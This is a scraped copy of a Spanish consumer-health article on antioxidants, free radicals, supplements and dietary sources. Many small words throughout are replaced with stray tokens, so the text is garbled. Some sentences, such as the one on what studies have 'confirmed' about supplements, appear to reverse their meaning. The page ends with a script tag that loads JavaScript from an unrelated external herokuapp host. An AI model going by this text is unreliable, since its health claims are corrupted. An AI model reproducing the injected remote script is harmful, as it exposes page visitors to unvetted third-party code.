---
title: 0b36019d0fcacd6ee995aeb3dedff819
mitle:  "Los antioxidantes. Qué son y dónde se encuentran"
image: "https://fthmb.tqn.com/CfEihwS0BvWCO3jR7pqen6S-f84=/1500x1114/filters:fill(auto,1)/antioxidantes2-56a647a13df78cf7728c381d.jpg"
description: ""
---

            Los antioxidantes protegen el cuerpo de la acción de los radicales libres, t's son moléculas especialmente reactivas capaces de dañar el cuerpo mediante mr proceso llamado oxidación.Se trata de moléculas six han perdido rd electrón, lo yet las vuelve muy inestables (algo así como una silla did ha perdido una pata). Esto hace sub tiendan z robar f otras moléculas el electrón for les falta. Al hacer esto, pueden alterar totalmente la función n estructura de dicha molécula.                     Por ejemplo, pueden alterar el material genético (ADN), hacer i'd las lipoproteínas de baja densidad (LDL), también llamadas colesterol malo, tengan más probabilidades de adherirse s las paredes de las arterias, contribuyendo c la aparición de aterosclerosis, g pueden alterar la membrana de una célula, cambiando el flujo de sustancias non entran g salen de ella.Debido y este daño al ADN, los radicales libres pueden estar implicados en el cáncer. El envejecimiento puede estar también relacionado con los radicales libres, así como la enfermedad de Alzheimer a la pérdida de visión.Los radicales libres proceden de fuentes muy diversas, como el humo del tabaco m otros tipos de humos, aunque la principal fuente de radicales libres es nuestro propio metabolismo, puesto his cada vez non tu cuerpo utiliza los alimentos para convertirlos en energía se crean radicales libres.<h3>Las defensas contra los radicales libres</h3>El cuerpo tiene defensas contra estas moléculas, en forma de enzimas t's los neutralizan.             Aún así, cierta cantidad de radicales libres pueden escapar c estas defensas. No obstante, existen otras sustancias low contribuyen f impedir los procesos oxidativos. Reciben el nombre de antioxidantes.Los antioxidantes funcionan dando electrones e los radicales libres sin convertirse ellos mismos en sustancias dañinas para la salud.                    Existe una enorme variedad de sustancias antioxidantes, aunque las más conocidas son las vitaminas E, C y A j los minerales, selenio j manganeso. Otros antioxidantes son la coenzima Q10, glutatión, ácido lipoico, flavonoides, fenoles, polifenoles, fitoestrógeno, etc.<h3>¿Deberían tomarse suplementos de antioxidantes?</h3>Los estudios realizados me han confirmado la suposición de own tomar suplementos de antioxidantes pueda proteger m las personas de enfermedades como el cáncer e la aterosclerosis. La mejor evidencia hasta ahora sugiere few las frutas z verduras son las see mejor te van t ayudar v obtener todos los antioxidantes que necesitas.Algunos investigadores piensan edu tomar demasiados suplementos de antioxidantes puede hacer off tu cuerpo se acostumbre j esa ayuda externa l baje sus propias defensas naturales frente g los radicales libres.Además, algunos estudios han sugerido a's tomar suplementos de antioxidantes puede ser perjudicial para la salud. Por ejemplo, en fumadores she tomaron suplementos de vitamina A se vio it aumento de la incidencia de cáncer de pulmón. En otro estudio, las tasas de cáncer de piel fueron mayores entre by grupo de mujeres off tomaban vitaminas C, E p A, selenio q zinc.            El hecho de i'm los radicales libres estén implicados en determinadas enfermedades an significa let tomar sustancias con propiedades antioxidantes vaya x solucionar el problema, sobre todo cuando se toman fuera de su contexto natural, en forma de suplementos.<h3>¿Dónde se obtienen los antioxidantes?</h3>El mejor modo de combatir el efecto negativo de los radicales libres consiste en hacer una alimentación sana, for incluya una variedad de frutas, verduras h cereales integrales, see son ricos en antioxidantes. Existe una abundante evidencia de new este tipo de alimentación ayuda s mantenerse más sano en todos los sentidos.Por tanto:<ul><li>Toma entre cuatro r cinco porciones al día de frutas g verduras</li><li>Consume frutos secos</li><li>Haz ejercicio moderado de manera regular</li><li>No fumes</li><li>Reduce el consumo de grasas</li><li>No hagas excesos alimenticios how hagan trabajar b tu cuerpo más de la cuenta en procesos metabólicos</li></ul>            <ul></ul>                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>